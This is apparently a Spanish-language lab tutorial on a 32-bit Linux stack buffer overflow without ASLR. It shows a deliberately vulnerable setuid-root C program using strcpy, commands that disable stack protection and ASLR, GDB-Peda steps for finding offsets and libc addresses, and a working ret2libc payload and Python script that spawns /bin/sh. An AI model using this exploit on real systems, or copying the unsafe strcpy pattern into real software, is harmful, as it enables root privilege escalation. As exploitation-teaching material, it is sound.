**EXPLICACÍON DETALLADA EN** [Buffer Overflow 32 Bits Linux (sin ASLR)](https://hacknotes.github.io/buffer%20overflow/buff32linuxSinAslr/)

## Script
```bash
#include <stdio.h>
#include <string.h>

int vuln(char *str)
{
    char buf[64];
    strcpy(buf,str);
    printf("Cadena: %s\n",buf);
    return 0;
}
int main(int argc, char* argv[])
{
    vuln(argv[1]);
}
```

## Compilación

 ```bash
gcc -fno-stack-protector -m32 buff.c -o buff
```

## Permisos
 
```bash
 chown root:root buff
 chmod +s buff
```
## Desactivar el ASLR
```python
echo 0 > /proc/sys/kernel/randomize_va_space
```
 
 ## GDB-Peda

Vemos los registros de la memoria

**Comando:** 
 ```bash
 i r
 ```
 
Crea cadenas aleatorias

**Comando:**
 ```bash
 pattern arg 100
 ```
 
 Ejecuta el binario

**Comando:**
 ```bash
 r
 ```
 
Encuentra el tamaño del offset.

**Comando:**
 ```bash
 pattern search
 ```
 
 Muestra la dirección de system.

**Comando:**
 ```bash
 p system
 ```
 Muestra la dirección de exit.

**Comando:**
 ```bash
 p exit
 ```
 Muestra la dirección de /bin/sh.

**Comando:**
 ```bash
 find "/bin/sh" all
 ```
 
 ## Payload final
 ```bash
 payload = offset + system + exit + /bin/sh
 
 $(python -c 'print "A"*76 + "\x10\x33\xe5\xb7" + "\x60\x62\xe4\xb7" + "\x4c\x5d\xf7\xb7"')
```

## Script en python
```python
#/usr/bin/python2
#Johnny Chafla | @jch | @hacknotes
#site https://hacknotes.github.io/

from struct import pack

offset = 76

systemAdd = pack("<I", 0xb7e53310)
exitAdd = pack("<I", 0xb7e46260)
binshAdd = pack("<I", 0xb7f75d4c)

junk = "A"*76

payload = junk + systemAdd + exitAdd + binshAdd

print payload
```

**EXPLICACÍON DETALLADA EN** [Buffer Overflow 32 Bits Linux (sin ASLR)](https://hacknotes.github.io/buffer%20overflow/buff32linuxSinAslr/)
